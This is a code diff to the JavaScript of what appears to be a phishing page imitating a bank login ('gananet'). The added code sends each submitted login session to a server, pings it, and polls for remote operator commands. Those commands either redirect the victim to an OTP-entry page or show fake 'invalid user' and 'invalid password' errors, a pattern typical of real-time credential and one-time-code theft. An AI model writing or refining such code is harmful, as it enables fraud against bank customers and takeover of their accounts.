@@ -1,29 +1,14 @@
-const CHANNEL = 'gananet-ops';
-const STORAGE_KEY = 'gananet-ops-event';
-const SESSIONS_KEY = 'gananet-ops-sessions';
-
-function publish(message) {
-  const payload = { ...message, ts: Date.now() };
-  try {
-    const ch = new BroadcastChannel(CHANNEL);
-    ch.postMessage(payload);
-    ch.close();
-  } catch (_) {}
-  try {
-    localStorage.setItem(STORAGE_KEY, JSON.stringify(payload));
-  } catch (_) {}
-}
-
 let sessionId = sessionStorage.getItem('sessionId') || ('sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9));
 sessionStorage.setItem('sessionId', sessionId);
 
 let pingInterval = null;
+let pollInterval = null;
 
 function startPing() {
   if (pingInterval) clearInterval(pingInterval);
-  publish({ type: 'session:ping', sessionId });
+  fetch(`/api/sessions/${sessionId}/ping`, { method: 'POST' }).catch(() => {});
   pingInterval = setInterval(() => {
-    publish({ type: 'session:ping', sessionId });
+    fetch(`/api/sessions/${sessionId}/ping`, { method: 'POST' }).catch(() => {});
   }, 3000);
 }
 
@@ -31,6 +16,44 @@ function stopPing() {
   if (pingInterval) {
     clearInterval(pingInterval);
     pingInterval = null;
+  }
+}
+
+function startPolling() {
+  if (pollInterval) clearInterval(pollInterval);
+  pollInterval = setInterval(async () => {
+    try {
+      const response = await fetch(`/api/sessions/${sessionId}`);
+      if (response.ok) {
+        const data = await response.json();
+        const action = data.action;
+        if (action === 'ganapin' || action === 'totp') {
+          stopPing();
+          stopPolling();
+          sessionStorage.setItem('otpType', action);
+          window.location.href = "clave.html";
+        } else if (action === 'error-user') {
+          stopPing();
+          stopPolling();
+          document.getElementById("svn-loader").hidden = true;
+          msg.textContent = "El usuario ingresado no es válido.";
+          msg.hidden = false;
+        } else if (action === 'error-pass') {
+          stopPing();
+          stopPolling();
+          document.getElementById("svn-loader").hidden = true;
+          msg.textContent = "La clave ingresada no es válida.";
+          msg.hidden = false;
+        }
+      }
+    } catch (_) {}
+  }, 2000);
+}
+
+function stopPolling() {
+  if (pollInterval) {
+    clearInterval(pollInterval);
+    pollInterval = null;
   }
 }
 
@@ -71,43 +94,6 @@ function showToast(text) {
   }, 2800);
 }
 
-function onMessage(data) {
-  if (!data || typeof data !== 'object') return;
-  if (data.sessionId !== sessionId) return;
-
-  if (data.type === 'session:action') {
-    const action = data.action;
-    if (action === 'ganapin' || action === 'totp') {
-      stopPing();
-      sessionStorage.setItem('otpType', action);
-      window.location.href = "clave.html";
-    } else if (action === 'error-user') {
-      stopPing();
-      document.getElementById("svn-loader").hidden = true;
-      msg.textContent = "El usuario ingresado no es válido.";
-      msg.hidden = false;
-    } else if (action === 'error-pass') {
-      stopPing();
-      document.getElementById("svn-loader").hidden = true;
-      msg.textContent = "La clave ingresada no es válida.";
-      msg.hidden = false;
-    }
-  }
-}
-
-try {
-  const ch = new BroadcastChannel(CHANNEL);
-  ch.onmessage = (event) => onMessage(event.data);
-} catch (_) {}
-
-window.addEventListener('storage', (event) => {
-  if (event.key === STORAGE_KEY && event.newValue) {
-    try {
-      onMessage(JSON.parse(event.newValue));
-    } catch (_) {}
-  }
-});
-
 window.addEventListener('DOMContentLoaded', () => {
   const params = new URLSearchParams(window.location.search);
   const error = params.get('error');
@@ -145,8 +131,20 @@ form.addEventListener("submit", (event) => {
     createdAt: Date.now()
   };
 
-  publish({ type: 'session:created', session });
-  startPing();
+  fetch('/api/sessions', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(session)
+  })
+  .then(() => {
+    startPing();
+    startPolling();
+  })
+  .catch(() => {
+    document.getElementById("svn-loader").hidden = true;
+    msg.textContent = "Error al intentar conectar. Intente de nuevo.";
+    msg.hidden = false;
+  });
 });
 
 document.getElementById("forgot-user").addEventListener("click", (event) => {
